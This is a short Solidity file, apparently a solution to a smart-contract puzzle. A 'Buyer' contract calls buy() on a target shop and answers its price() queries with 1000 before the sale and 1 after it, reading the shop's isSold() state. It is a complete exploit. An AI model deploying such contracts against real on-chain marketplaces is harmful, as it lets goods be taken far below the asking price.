// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer {
    IShop victim;

    function attack(address _victim) external {
        victim = IShop(_victim);
        victim.buy();
    }

    function price() public view returns (uint) {
        if(victim.isSold()) return 1; // if sold then make the price lower
        else return 1000;
    }
}

interface IShop {
    function buy() external;
    function isSold() external view returns(bool); // a getter function since isSold is public
}